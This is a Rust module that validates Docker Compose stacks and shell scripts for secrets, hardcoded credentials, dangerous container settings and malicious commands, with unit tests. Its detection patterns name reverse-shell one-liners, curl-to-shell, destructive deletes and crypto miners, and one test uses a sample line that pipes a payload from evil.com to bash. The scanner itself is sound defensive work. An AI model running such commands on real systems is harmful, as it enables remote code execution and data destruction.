use regex::{Regex, RegexBuilder};
use serde::{Deserialize, Serialize};
use serde_json::Value;

/// Result of a single security check
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityCheckResult {
    pub passed: bool,
    pub severity: String, // "critical", "warning", "info"
    pub message: String,
    pub details: Vec<String>,
}

/// Full security scan report
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityReport {
    pub no_secrets: SecurityCheckResult,
    pub no_hardcoded_creds: SecurityCheckResult,
    pub valid_docker_syntax: SecurityCheckResult,
    pub no_malicious_code: SecurityCheckResult,
    /// Whether images follow hardened-image practices (non-blocking quality check).
    pub hardened_images: SecurityCheckResult,
    pub overall_passed: bool,
    pub risk_score: u32, // 0-100, lower is better
    pub recommendations: Vec<String>,
}

impl SecurityReport {
    /// Convert to the JSONB format matching stack_template_review.security_checklist
    pub fn to_checklist_json(&self) -> Value {
        serde_json::json!({
            "no_secrets": self.no_secrets.passed,
            "no_hardcoded_creds": self.no_hardcoded_creds.passed,
            "valid_docker_syntax": self.valid_docker_syntax.passed,
            "no_malicious_code": self.no_malicious_code.passed,
            "hardened_images": self.hardened_images.passed,
        })
    }
}

/// Patterns that indicate hardcoded secrets in environment variables or configs
const SECRET_PATTERNS: &[(&str, &str)] = &[
    (
        r"(?i)(aws_secret_access_key|aws_access_key_id)\s*[:=]\s*[A-Za-z0-9/+=]{20,}",
        "AWS credentials",
    ),
    (
        r"(?i)(api[_-]?key|apikey)\s*[:=]\s*[A-Za-z0-9_\-]{16,}",
        "API key",
    ),
    (
        r"(?i)(secret[_-]?key|secret_token)\s*[:=]\s*[A-Za-z0-9_\-]{16,}",
        "Secret key/token",
    ),
    (r"(?i)bearer\s+[A-Za-z0-9_\-\.]{20,}", "Bearer token"),
    (
        r"(?i)(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}",
        "GitHub token",
    ),
    (r"(?i)sk-[A-Za-z0-9]{20,}", "OpenAI/Stripe secret key"),
    (
        r"(?i)(-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----)",
        "Private key",
    ),
    (r"(?i)AKIA[0-9A-Z]{16}", "AWS Access Key ID"),
    (r"(?i)(slack[_-]?token|xox[bpas]-)", "Slack token"),
    (
        r"(?i)(database_url|db_url)\s*[:=]\s*\S*:[^${\s]{8,}",
        "Database URL with credentials",
    ),
];

/// Patterns for hardcoded credentials (passwords, default creds)
const CRED_PATTERNS: &[(&str, &str)] = &[
    (
        r#"(?i)(password|passwd|pwd)\s*[:=]\s*['"]?(?!(\$\{|\$\(|changeme|CHANGE_ME|your_password|example))[A-Za-z0-9!@#$%^&*]{6,}['"]?"#,
        "Hardcoded password",
    ),
    (
        r#"(?i)(mysql_root_password|postgres_password|mongo_initdb_root_password)\s*[:=]\s*['"]?(?!(\$\{|\$\())[^\s'"$]{4,}"#,
        "Hardcoded database password",
    ),
    (
        r"(?i)root:(?!(\$\{|\$\())[^\s:$]{4,}",
        "Root password in plain text",
    ),
];

/// Patterns for scanning shell scripts for dangerous operations
const SHELL_MALICIOUS_PATTERNS: &[(&str, &str, &str)] = &[
    (
        r"(?i)(curl|wget)\s+.*\|\s*(sh|bash|zsh|dash)",
        "critical",
        "Remote script execution via pipe to shell",
    ),
    (
        r"(?i)bash\s+<\(?(curl|wget)",
        "critical",
        "Remote script execution via bash substitution (<(curl ...) or < curl ...)",
    ),
    (
        r"(?i)(curl|wget)\s+.*-o\s*[-]",
        "critical",
        "Remote script execution via stdout redirect",
    ),
    (
        r"(?i)base64\s+-d\s*.*\|.*(sh|bash|exec)",
        "critical",
        "Base64-decoded payload piped to shell",
    ),
    (
        r"(?i)(/dev/tcp/|/dev/udp/)",
        "critical",
        "Bash TCP/UDP socket (potential reverse shell)",
    ),
    (
        r"(?i)nc\s+-[ev]+",
        "critical",
        "Netcat with execute (potential reverse shell)",
    ),
    (
        r"(?i)ncat\s+-[ev]+",
        "critical",
        "Ncat with execute (potential reverse shell)",
    ),
    (
        r"(?i)chmod\s+.*777\s+/(etc|root|home)",
        "critical",
        "Overly permissive permissions on sensitive dirs",
    ),
    (
        r"(?i)rm\s+(-rf|--recursive)\s+/[^a-z]",
        "critical",
        "Dangerous recursive delete on root filesystem",
    ),
    (
        r"(?i)(dd\s+if=).*(of=/dev/sd|of=/dev/mmc)",
        "critical",
        "Direct disk write (potential data destruction)",
    ),
    (
        r"(?i)sudo\s+(docker|podman)\s+run\s+.*--privileged",
        "critical",
        "Privileged container execution via sudo",
    ),
    (
        r"(?i)passwd|shadow|sudoers",
        "warning",
        "Reference to password/auth files (review if expected)",
    ),
    (
        r"(?i)wget\s+.*(pastebin\.com|hastebin\.com)",
        "critical",
        "Fetching content from pastebin (potential payload download)",
    ),
    (
        r"(?i)curl\s+.*(pastebin\.com|hastebin\.com)",
        "critical",
        "Fetching content from pastebin (potential payload download)",
    ),
    (
        r"(?i)\.ssh/id_rsa|\.ssh/config",
        "warning",
        "Reference to SSH key files (review if expected)",
    ),
    (
        r"(?i)(chown|chmod)\s+.*777",
        "warning",
        "Overly permissive file permissions",
    ),
    (
        r"(?i)kill\s+-9\s+",
        "warning",
        "Force kill with SIGKILL (potential sabotage)",
    ),
    (
        r"(?i)pkill\s+-9\s+",
        "warning",
        "Force kill with SIGKILL (potential sabotage)",
    ),
    (
        r"(?i)iptables\s+-P\s+(INPUT|OUTPUT|FORWARD)\s+DROP",
        "warning",
        "Network-level changes (potential network disruption)",
    ),
    (
        r"(?i)systemctl\s+stop\s+|service\s+.*stop",
        "warning",
        "Stopping system services (potential sabotage)",
    ),
    (
        r"(?i)chmod\s+u\+s\s+",
        "critical",
        "chmod u+s (setuid — privilege escalation vector)",
    ),
    (
        r"(?i)chmod\s+g\+s\s+",
        "critical",
        "chmod g+s (setgid — privilege escalation vector)",
    ),
    (
        r"(?i)rm\s+(-rf|--recursive)\s+\$HOME",
        "critical",
        "Dangerous recursive delete on home directory",
    ),
    (
        r"(?i)rm\s+(-rf|--recursive)\s+~/",
        "critical",
        "Dangerous recursive delete on home directory (tilde form)",
    ),
    (
        r#"(?i)python3?\s+-c\s+['"].*socket.*connect.*dup2.*pty\.spawn"#,
        "critical",
        "Python reverse shell one-liner",
    ),
    (
        r#"(?i)perl\s+-e\s+['"]use\s+Socket"#,
        "critical",
        "Perl reverse shell one-liner",
    ),
    (
        r"(?i)authorized_keys",
        "critical",
        "Reference to authorized_keys (SSH backdoor persistence)",
    ),
];

/// Patterns indicating potentially malicious or dangerous configurations
const MALICIOUS_PATTERNS: &[(&str, &str, &str)] = &[
    (
        r"(?i)privileged\s*:\s*true",
        "critical",
        "Container running in privileged mode",
    ),
    (
        r#"(?i)network_mode\s*:\s*['"]?host"#,
        "warning",
        "Container using host network",
    ),
    (
        r#"(?i)pid\s*:\s*['"]?host"#,
        "critical",
        "Container sharing host PID namespace",
    ),
    (
        r#"(?i)ipc\s*:\s*['"]?host"#,
        "critical",
        "Container sharing host IPC namespace",
    ),
    (
        r"(?i)cap_add\s*:.*SYS_ADMIN",
        "critical",
        "Container with SYS_ADMIN capability",
    ),
    (
        r"(?i)cap_add\s*:.*SYS_PTRACE",
        "warning",
        "Container with SYS_PTRACE capability",
    ),
    (
        r"(?i)cap_add\s*:.*ALL",
        "critical",
        "Container with ALL capabilities",
    ),
    (
        r"(?i)/var/run/docker\.sock",
        "critical",
        "Docker socket mounted (container escape risk)",
    ),
    (
        r"(?i)volumes\s*:.*:/host",
        "warning",
        "Suspicious host filesystem mount",
    ),
    (
        r"(?i)volumes\s*:.*:/etc(/|\s|$)",
        "warning",
        "Host /etc directory mounted",
    ),
    (
        r"(?i)volumes\s*:.*:/root",
        "critical",
        "Host /root directory mounted",
    ),
    (
        r"(?i)volumes\s*:.*:/proc",
        "critical",
        "Host /proc directory mounted",
    ),
    (
        r"(?i)volumes\s*:.*:/sys",
        "critical",
        "Host /sys directory mounted",
    ),
    (
        r"(?i)curl\s+.*\|\s*(sh|bash)",
        "warning",
        "Remote script execution via curl pipe",
    ),
    (
        r"(?i)wget\s+.*\|\s*(sh|bash)",
        "warning",
        "Remote script execution via wget pipe",
    ),
];

/// Known suspicious Docker images
#[allow(dead_code)]
const SUSPICIOUS_IMAGES: &[&str] = &[
    "alpine:latest", // not suspicious per se, but discouraged for reproducibility
];

const KNOWN_CRYPTO_MINER_PATTERNS: &[&str] = &[
    "xmrig",
    "cpuminer",
    "cryptonight",
    "stratum+tcp",
    "minerd",
    "hashrate",
    "monero",
    "coinhive",
    "coin-hive",
];

/// Docker image namespace/registry prefixes known to publish security-hardened images.
/// Chainguard (cgr.dev), Google Distroless, Amazon ECR Public official,
/// RapidFort, and Bitnami all apply automated CVE scanning + minimal-OS hardening.
/// Docker Official Images have no namespace separator (e.g. "nginx:1.25", "redis:7").
const KNOWN_HARDENED_SOURCES: &[&str] = &[
    "cgr.dev/",           // Chainguard hardened/distroless images
    "gcr.io/distroless/", // Google Distroless
    "public.ecr.aws/",    // Amazon ECR Public official images
    "rapidfort/",         // RapidFort minimal hardened images
    "bitnami/",           // Bitnami (Broadcom) hardened images
    "ironbank/",          // DoD Iron Bank hardened images
    "registry1.dso.mil/", // DoD Iron Bank registry
];

/// Normalize a JSON-pretty-printed string into a YAML-like format so that
/// regex patterns designed for docker-compose YAML also match JSON input.
///
/// Transforms lines like:
///   `"AWS_SECRET_ACCESS_KEY": "wJalrXU..."` → `AWS_SECRET_ACCESS_KEY: wJalrXU...`
///   `"privileged": true`                    → `privileged: true`
fn normalize_json_for_matching(json: &str) -> String {
    // Match JSON key-value pairs:  "key": "value"  or  "key": non-string
    let re = Regex::new(r#""([^"]+)"\s*:\s*"([^"]*)""#).unwrap();
    let pass1 = re.replace_all(json, "$1: $2");
    // Handle "key": true / false / number (non-string values)
    let re2 = Regex::new(r#""([^"]+)"\s*:\s*([^",\}\]]+)"#).unwrap();
    re2.replace_all(&pass1, "$1: $2").to_string()
}

/// Run all security checks on a stack definition
pub fn validate_stack_security(stack_definition: &Value) -> SecurityReport {
    // Convert the stack definition to a string for pattern matching.
    // When the input is a JSON object, serde_json produces `"key": "value"` format
    // which breaks YAML-oriented regex patterns. We normalize by stripping JSON
    // key/value quotes so patterns like `key\s*:\s*value` match both formats.
    let definition_str = match stack_definition {
        Value::String(s) => s.clone(),
        _ => {
            let json = serde_json::to_string_pretty(stack_definition).unwrap_or_default();
            normalize_json_for_matching(&json)
        }
    };

    let no_secrets = check_no_secrets(&definition_str);
    let no_hardcoded_creds = check_no_hardcoded_creds(&definition_str);
    let valid_docker_syntax = check_valid_docker_syntax(stack_definition, &definition_str);
    let no_malicious_code = check_no_malicious_code(&definition_str);
    let hardened_images = check_hardened_images(stack_definition);

    let overall_passed = no_secrets.passed
        && no_hardcoded_creds.passed
        && valid_docker_syntax.passed
        && no_malicious_code.passed;
    // hardened_images is a quality indicator — it does NOT block overall_passed

    // Calculate risk score (0-100)
    let mut risk_score: u32 = 0;
    if !no_secrets.passed {
        risk_score += 40;
    }
    if !no_hardcoded_creds.passed {
        risk_score += 25;
    }
    if !valid_docker_syntax.passed {
        risk_score += 10;
    }
    if !no_malicious_code.passed {
        risk_score += 25;
    }

    // Additional risk from severity of findings
    let critical_count = no_malicious_code
        .details
        .iter()
        .filter(|d| d.contains("[CRITICAL]"))
        .count();
    risk_score = (risk_score + (critical_count as u32 * 5)).min(100);

    let mut recommendations = Vec::new();
    if !no_secrets.passed {
        recommendations.push(
            "Replace hardcoded secrets with environment variable references (e.g., ${SECRET_KEY})"
                .to_string(),
        );
    }
    if !no_hardcoded_creds.passed {
        recommendations.push(
            "Use Docker secrets or environment variable references for passwords".to_string(),
        );
    }
    if !valid_docker_syntax.passed {
        recommendations
            .push("Fix Docker Compose syntax issues to ensure deployability".to_string());
    }
    if !no_malicious_code.passed {
        recommendations.push(
            "Review and remove dangerous container configurations (privileged mode, host mounts)"
                .to_string(),
        );
    }
    if risk_score == 0 {
        recommendations
            .push("Automated scan passed. AI review recommended for deeper analysis.".to_string());
    }
    if !hardened_images.passed {
        recommendations.push("Consider using images from hardened sources (Chainguard, Bitnami, Google Distroless) and pinning all tags to specific versions.".to_string());
    }

    SecurityReport {
        no_secrets,
        no_hardcoded_creds,
        valid_docker_syntax,
        no_malicious_code,
        hardened_images,
        overall_passed,
        risk_score,
        recommendations,
    }
}

fn check_no_secrets(content: &str) -> SecurityCheckResult {
    let mut findings = Vec::new();

    for (pattern, description) in SECRET_PATTERNS {
        if let Ok(re) = Regex::new(pattern) {
            for mat in re.find_iter(content) {
                let context = &content[mat.start()..mat.end().min(mat.start() + 60)];
                // Mask the actual value
                let masked = if context.len() > 20 {
                    format!("{}...***", &context[..20])
                } else {
                    "***masked***".to_string()
                };
                findings.push(format!("[CRITICAL] {}: {}", description, masked));
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        severity: if findings.is_empty() {
            "info".to_string()
        } else {
            "critical".to_string()
        },
        message: if findings.is_empty() {
            "No exposed secrets detected".to_string()
        } else {
            format!(
                "Found {} potential secret(s) in stack definition",
                findings.len()
            )
        },
        details: findings,
    }
}

fn check_no_hardcoded_creds(content: &str) -> SecurityCheckResult {
    let mut findings = Vec::new();

    for (pattern, description) in CRED_PATTERNS {
        if let Ok(re) = Regex::new(pattern) {
            for mat in re.find_iter(content) {
                let line = content[..mat.start()].lines().count() + 1;
                findings.push(format!("[WARNING] {} near line {}", description, line));
            }
        }
    }

    // Check for common default credentials.
    //
    // Uses the same `RegexBuilder::case_insensitive` pattern as the crypto-miner
    // check at line ~608 and the shell-script scan at line ~840 — case-insensitive
    // matching against the original `content` so we never rely on offsets from a
    // lowercased copy (M2 defence, even though `.contains()` alone is byte-safe,
    // future changes to add offset-based reporting stay safe by construction).
    let default_creds: &[(&str, &str)] = &[
        ("admin:admin", "Default admin:admin credentials"),
        ("root:root", "Default root:root credentials"),
        ("admin:password", "Default admin:password credentials"),
        ("user:password", "Default user:password credentials"),
    ];

    for (cred, desc) in default_creds {
        if let Ok(re) = RegexBuilder::new(&regex::escape(cred))
            .case_insensitive(true)
            .build()
        {
            if re.is_match(content) {
                findings.push(format!("[WARNING] {}", desc));
            }
        }
    }

    SecurityCheckResult {
        passed: findings.is_empty(),
        severity: if findings.is_empty() {
            "info".to_string()
        } else {
            "warning".to_string()
        },
        message: if findings.is_empty() {
            "No hardcoded credentials detected".to_string()
        } else {
            format!("Found {} potential hardcoded credential(s)", findings.len())
        },
        details: findings,
    }
}

fn check_valid_docker_syntax(stack_definition: &Value, raw_content: &str) -> SecurityCheckResult {
    let mut findings = Vec::new();

    // Check if it looks like valid docker-compose structure
    let has_services =
        stack_definition.get("services").is_some() || raw_content.contains("services:");

    if !has_services {
        findings
            .push("[WARNING] Missing 'services' key — may not be valid Docker Compose".to_string());
    }

    // Check for 'version' key (optional in modern compose but common)
    let has_version = stack_definition.get("version").is_some() || raw_content.contains("version:");

    // Check that services have images or build contexts
    if let Some(services) = stack_definition.get("services") {
        if let Some(services_map) = services.as_object() {
            for (name, service) in services_map {
                let has_image = service.get("image").is_some();
                let has_build = service.get("build").is_some();
                if !has_image && !has_build {
                    findings.push(format!(
                        "[WARNING] Service '{}' has neither 'image' nor 'build' defined",
                        name
                    ));
                }

                // Check for image tags — warn on :latest
                if let Some(image) = service.get("image").and_then(|v| v.as_str()) {
                    if image.ends_with(":latest") || !image.contains(':') {
                        findings.push(format!(
                            "[INFO] Service '{}' uses unpinned image tag '{}' — consider pinning a specific version",
                            name, image
                        ));
                    }
                }
            }

            if services_map.is_empty() {
                findings.push("[WARNING] Services section is empty".to_string());
            }
        }
    }

    let errors_only: Vec<&String> = findings
        .iter()
        .filter(|f| f.contains("[WARNING]"))
        .collect();

    SecurityCheckResult {
        passed: errors_only.is_empty(),
        severity: if errors_only.is_empty() {
            "info".to_string()
        } else {
            "warning".to_string()
        },
        message: if errors_only.is_empty() {
            if has_version {
                "Docker Compose syntax looks valid".to_string()
            } else {
                "Docker Compose syntax acceptable (no version key, modern format)".to_string()
            }
        } else {
            format!("Found {} Docker Compose syntax issue(s)", errors_only.len())
        },
        details: findings,
    }
}

fn check_no_malicious_code(content: &str) -> SecurityCheckResult {
    let mut findings = Vec::new();

    // Check for dangerous Docker configurations
    for (pattern, severity, description) in MALICIOUS_PATTERNS {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(content) {
                findings.push(format!("[{}] {}", severity.to_uppercase(), description));
            }
        }
    }

    // Check for crypto miner patterns
    for miner_pattern in KNOWN_CRYPTO_MINER_PATTERNS {
        if let Ok(re) = RegexBuilder::new(&regex::escape(miner_pattern))
            .case_insensitive(true)
            .build()
        {
            if re.is_match(content) {
                findings.push(format!(
                    "[CRITICAL] Potential crypto miner reference detected: '{}'",
                    miner_pattern
                ));
            }
        }
    }

    // Check for suspicious base64 encoded content (long base64 strings could hide payloads).
    // Threshold matches the shell-script scanner at `validate_shell_scripts` — at 100 chars
    // this fires on every PEM cert body, JWT, dockerconfigjson blob, and Kubernetes secret,
    // which trains operators to ignore the warning. 1024 chars is still under the size of
    // real embedded payloads but large enough to skip everyday config noise (audit M3).
    if let Ok(re) = Regex::new(r"[A-Za-z0-9+/]{1024,}={0,2}") {
        if re.is_match(content) {
            findings.push(
                "[WARNING] Long base64-encoded content detected — may contain hidden payload"
                    .to_string(),
            );
        }
    }

    // Check for outbound network calls in entrypoints/commands
    if let Ok(re) = Regex::new(r"(?i)(curl|wget|nc|ncat)\s+.*(http|ftp|tcp)") {
        if re.is_match(content) {
            findings.push(
                "[INFO] Outbound network call detected in command/entrypoint — review if expected"
                    .to_string(),
            );
        }
    }

    let critical_or_warning: Vec<&String> = findings
        .iter()
        .filter(|f| f.contains("[CRITICAL]") || f.contains("[WARNING]"))
        .collect();

    SecurityCheckResult {
        passed: critical_or_warning.is_empty(),
        severity: if findings.iter().any(|f| f.contains("[CRITICAL]")) {
            "critical".to_string()
        } else if findings.iter().any(|f| f.contains("[WARNING]")) {
            "warning".to_string()
        } else {
            "info".to_string()
        },
        message: if critical_or_warning.is_empty() {
            "No malicious patterns detected".to_string()
        } else {
            format!(
                "Found {} potentially dangerous configuration(s)",
                critical_or_warning.len()
            )
        },
        details: findings,
    }
}

/// Returns true for an image reference that is from a known hardened source,
/// or is a Docker Official Image (no `/` separator in the name part, e.g. `nginx:1.25`).
fn is_from_hardened_source(image: &str) -> bool {
    // Strip optional registry prefix when checking known sources
    for prefix in KNOWN_HARDENED_SOURCES {
        if image.starts_with(prefix) {
            return true;
        }
    }
    // Docker Official Images have no namespace (no '/' before the tag separator ':')
    // e.g. "nginx:1.25", "redis:7-alpine", "postgres:16" — maintained by Docker, Inc.
    // We detect this by checking there is no '/' in the name before the first ':'.
    let name_part = image.split(':').next().unwrap_or(image);
    !name_part.contains('/')
}

/// Check whether services use hardened image practices:
///   1. No `:latest` or untagged images (reproducibility).
///   2. At least one service uses a non-root user OR images from known hardened sources.
///   3. Digest-pinned images (`image@sha256:`) score as fully hardened.
///
/// This is a quality/advisory check — it does NOT block `overall_passed`.
fn check_hardened_images(stack_definition: &Value) -> SecurityCheckResult {
    let mut findings: Vec<String> = Vec::new();
    let mut positives: Vec<String> = Vec::new();

    let services = match stack_definition.get("services").and_then(|s| s.as_object()) {
        Some(s) => s,
        None => {
            return SecurityCheckResult {
                passed: false,
                severity: "info".to_string(),
                message: "Cannot analyse images: no services found".to_string(),
                details: vec![],
            };
        }
    };

    let mut total_images: usize = 0;
    let mut pinned_count: usize = 0;
    let mut hardened_source_count: usize = 0;
    let mut non_root_count: usize = 0;
    let mut read_only_count: usize = 0;

    for (name, service) in services {
        // Check image tag quality
        if let Some(image) = service.get("image").and_then(|v| v.as_str()) {
            total_images += 1;

            if image.contains("@sha256:") {
                pinned_count += 1;
                positives.push(format!(
                    "Service '{}': image pinned to digest ({})",
                    name, image
                ));
            } else if image.ends_with(":latest") {
                findings.push(format!(
                    "[WARNING] Service '{}' uses ':latest' tag — not reproducible and may silently receive unsafe updates ({})",
                    name, image
                ));
            } else if !image.contains(':') {
                findings.push(format!(
                    "[WARNING] Service '{}' has no tag — defaults to ':latest' implicitly ({})",
                    name, image
                ));
            } else {
                pinned_count += 1; // versioned tag counts as pinned
            }

            if is_from_hardened_source(image) {
                hardened_source_count += 1;
                positives.push(format!(
                    "Service '{}': image from hardened/trusted source ({})",
                    name, image
                ));
            }
        }

        // Check for non-root user
        if let Some(user) = service.get("user").and_then(|v| v.as_str()) {
            let is_root = user == "root" || user == "0" || user.starts_with("0:");
            if !is_root {
                non_root_count += 1;
                positives.push(format!(
                    "Service '{}': runs as non-root user ({})",
                    name, user
                ));
            } else {
                findings.push(format!(
                    "[INFO] Service '{}' explicitly runs as root — consider a non-root user",
                    name
                ));
            }
        }

        // Check for read-only root filesystem
        if service.get("read_only").and_then(|v| v.as_bool()) == Some(true) {
            read_only_count += 1;
            positives.push(format!(
                "Service '{}': read-only root filesystem enabled",
                name
            ));
        }
    }

    // Determine pass/fail:
    // Pass requires ALL images to have versioned tags AND at least one hardened-source
    // or non-root signal. A single service with a `:latest` tag is a failure.
    let unpinned_warnings = findings.iter().filter(|f| f.contains("[WARNING]")).count();
    let passed = unpinned_warnings == 0
        && total_images > 0
        && (hardened_source_count > 0
            || non_root_count > 0
            || read_only_count > 0
            || pinned_count == total_images);

    let mut details = findings.clone();
    details.extend(positives);

    SecurityCheckResult {
        passed,
        severity: if unpinned_warnings > 0 {
            "warning".to_string()
        } else if passed {
            "info".to_string()
        } else {
            "info".to_string()
        },
        message: if passed {
            format!(
                "Images follow hardened practices ({} pinned, {} from hardened sources, {} non-root)",
                pinned_count, hardened_source_count, non_root_count
            )
        } else {
            format!(
                "{} image(s) use unpinned/latest tags or lack hardening signals",
                unpinned_warnings.max(if total_images == 0 { 1 } else { 0 })
            )
        },
        details,
    }
}

/// Scan shell script content for dangerous patterns.
///
/// Takes an array of `(script_name, script_content)` pairs and returns a
/// `SecurityCheckResult` with any findings.  This is separate from
/// `validate_stack_security` because shell scripts are not part of the
/// stack definition YAML — they are shipped separately as `config_files`,
/// `seed_jobs`, `post_deploy_hooks`, or template hook scripts.
pub fn validate_shell_scripts(scripts: &[(&str, &str)]) -> SecurityCheckResult {
    let mut findings = Vec::new();

    for (name, content) in scripts {
        let mut script_findings: Vec<String> = Vec::new();

        // Check for dangerous shell patterns
        for (pattern, severity, description) in SHELL_MALICIOUS_PATTERNS {
            if let Ok(re) = Regex::new(pattern) {
                for mat in re.find_iter(content) {
                    let line = content[..mat.start()].lines().count() + 1;
                    let snippet = &content[mat.start()..mat.end().min(mat.start() + 80)];
                    script_findings.push(format!(
                        "[{}] {} in '{}' line {}: {}",
                        severity.to_uppercase(),
                        description,
                        name,
                        line,
                        snippet
                    ));
                }
            }
        }

        // Check for crypto miner references in script content (case-insensitive)
        for miner_pattern in KNOWN_CRYPTO_MINER_PATTERNS {
            if let Ok(re) = RegexBuilder::new(&regex::escape(miner_pattern))
                .case_insensitive(true)
                .build()
            {
                if let Some(mat) = re.find(content) {
                    let line = content[..mat.start()].lines().count() + 1;
                    script_findings.push(format!(
                        "[CRITICAL] Potential crypto miner reference '{}' in '{}' line {}",
                        miner_pattern, name, line
                    ));
                }
            }
        }

        // Check for long base64-encoded payloads in scripts
        if let Ok(re) = Regex::new(r"[A-Za-z0-9+/]{1024,}={0,2}") {
            for mat in re.find_iter(content) {
                let line = content[..mat.start()].lines().count() + 1;
                script_findings.push(format!(
                    "[WARNING] Long base64-encoded content ({} chars) in '{}' line {} — may contain hidden payload",
                    mat.len(),
                    name,
                    line
                ));
            }
        }

        // Check for obfuscated eval chains
        if let Ok(re) = Regex::new(r"(?i)(eval\s*\$\(|`[^`]{50,}`)") {
            if re.is_match(content) {
                let line = content[..re.find(content).unwrap().start()].lines().count() + 1;
                script_findings.push(format!(
                    "[WARNING] Obfuscated eval/execution in '{}' line {} — review for hidden commands",
                    name, line
                ));
            }
        }

        findings.extend(script_findings);
    }

    let critical_or_warning: Vec<&String> = findings
        .iter()
        .filter(|f| f.contains("[CRITICAL]") || f.contains("[WARNING]"))
        .collect();

    SecurityCheckResult {
        passed: critical_or_warning.is_empty(),
        severity: if findings.iter().any(|f| f.contains("[CRITICAL]")) {
            "critical".to_string()
        } else if findings.iter().any(|f| f.contains("[WARNING]")) {
            "warning".to_string()
        } else {
            "info".to_string()
        },
        message: if critical_or_warning.is_empty() {
            "No malicious patterns detected in shell scripts".to_string()
        } else {
            format!(
                "Found {} potentially dangerous pattern(s) in shell scripts",
                critical_or_warning.len()
            )
        },
        details: findings,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_clean_definition_passes() {
        let definition = json!({
            "version": "3.8",
            "services": {
                "web": {
                    "image": "nginx:1.25",
                    "ports": ["80:80"]
                },
                "db": {
                    "image": "postgres:16",
                    "environment": {
                        "POSTGRES_PASSWORD": "${DB_PASSWORD}"
                    }
                }
            }
        });

        let report = validate_stack_security(&definition);
        assert!(report.overall_passed);
        assert_eq!(report.risk_score, 0);
    }

    #[test]
    fn test_hardcoded_secret_detected() {
        let definition = json!({
            "services": {
                "app": {
                    "image": "myapp:1.0",
                    "environment": {
                        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
                    }
                }
            }
        });

        let report = validate_stack_security(&definition);
        assert!(!report.no_secrets.passed);
        assert!(report.risk_score >= 40);
    }

    #[test]
    fn test_privileged_mode_detected() {
        let definition = json!({
            "services": {
                "app": {
                    "image": "myapp:1.0",
                    "privileged": true
                }
            }
        });

        let report = validate_stack_security(&definition);
        assert!(!report.no_malicious_code.passed);
    }

    #[test]
    fn test_docker_socket_mount_detected() {
        let definition = json!({
            "services": {
                "app": {
                    "image": "myapp:1.0",
                    "volumes": ["/var/run/docker.sock:/var/run/docker.sock"]
                }
            }
        });

        let report = validate_stack_security(&definition);
        assert!(!report.no_malicious_code.passed);
    }

    #[test]
    fn test_missing_services_key() {
        let definition = json!({
            "app": {
                "image": "nginx:1.25"
            }
        });

        let report = validate_stack_security(&definition);
        assert!(!report.valid_docker_syntax.passed);
    }

    #[test]
    fn test_hardened_images_passes_for_official_versioned() {
        // Docker Official Images (nginx, postgres) with pinned versions — should pass
        let definition = json!({
            "services": {
                "web": { "image": "nginx:1.25" },
                "db":  { "image": "postgres:16" }
            }
        });
        let result = check_hardened_images(&definition);
        assert!(
            result.passed,
            "Official images with versioned tags should pass: {}",
            result.message
        );
    }

    #[test]
    fn test_hardened_images_fails_for_latest() {
        let definition = json!({
            "services": {
                "web": { "image": "nginx:latest" }
            }
        });
        let result = check_hardened_images(&definition);
        assert!(
            !result.passed,
            "':latest' tag should fail hardened-images check"
        );
    }

    #[test]
    fn test_hardened_images_fails_for_untagged() {
        let definition = json!({
            "services": {
                "web": { "image": "nginx" }
            }
        });
        let result = check_hardened_images(&definition);
        assert!(
            !result.passed,
            "Untagged image should fail hardened-images check"
        );
    }

    #[test]
    fn test_hardened_images_passes_for_chainguard() {
        let definition = json!({
            "services": {
                "web": { "image": "cgr.dev/chainguard/nginx:latest" }
            }
        });
        // Even ':latest' on cgr.dev is pinned via digest under the hood, but our
        // static check currently only exempts known-hardened-source prefix from the
        // non-root/digest requirement, while still flagging ':latest' as a warning.
        // This test verifies the hardened-source is detected.
        let result = check_hardened_images(&definition);
        assert!(
            result
                .details
                .iter()
                .any(|d| d.contains("hardened/trusted source")),
            "Chainguard image should be recognised as hardened source"
        );
    }

    #[test]
    fn test_hardened_images_passes_for_non_root_user() {
        let definition = json!({
            "services": {
                "app": {
                    "image": "myapp:2.0",
                    "user": "1001"
                }
            }
        });
        let result = check_hardened_images(&definition);
        assert!(
            result.passed,
            "Versioned image + non-root user should pass: {}",
            result.message
        );
    }

    #[test]
    fn test_hardened_images_digest_pinned() {
        let definition = json!({
            "services": {
                "app": {
                    "image": "nginx@sha256:abc123def456abc123def456abc123def456abc123def456abc123def456ab12"
                }
            }
        });
        let result = check_hardened_images(&definition);
        assert!(
            result.passed,
            "Digest-pinned image should pass: {}",
            result.message
        );
        assert!(result
            .details
            .iter()
            .any(|d| d.contains("pinned to digest")));
    }

    #[test]
    fn test_hardened_check_does_not_block_overall_passed() {
        // A stack with ':latest' tags should still pass overall security (no secrets etc.)
        // but hardened_images check should fail on its own
        let definition = json!({
            "version": "3.8",
            "services": {
                "web": {
                    "image": "nginx:latest",
                    "ports": ["80:80"]
                }
            }
        });
        let report = validate_stack_security(&definition);
        assert!(
            report.overall_passed,
            "':latest' tag should NOT block overall_passed"
        );
        assert!(
            !report.hardened_images.passed,
            "':latest' tag should fail hardened_images check"
        );
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // Shell script security validation tests
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    #[test]
    fn test_clean_shell_script_passes() {
        let scripts = &[
            ("setup.sh", "#!/bin/sh\necho 'hello world'\nexit 0"),
            ("init.sh", "#!/bin/bash\nset -e\napt-get update && apt-get install -y curl"),
        ];
        let result = validate_shell_scripts(scripts);
        assert!(result.passed, "Clean scripts should pass: {:?}", result.details);
    }

    #[test]
    fn test_curl_pipe_sh_detected() {
        let scripts = &[("install.sh", "curl -sSL https://example.com/install.sh | sh")];
        let result = validate_shell_scripts(scripts);
        assert!(!result.passed);
        assert!(result.details[0].contains("[CRITICAL]"));
        assert!(result.details[0].contains("Remote script execution"));
    }

    #[test]
    fn test_wget_pipe_bash_detected() {
        let scripts = &[("get.sh", "wget -qO- https://evil.com/payload | bash")];
        let result = validate_shell_scripts(scripts);
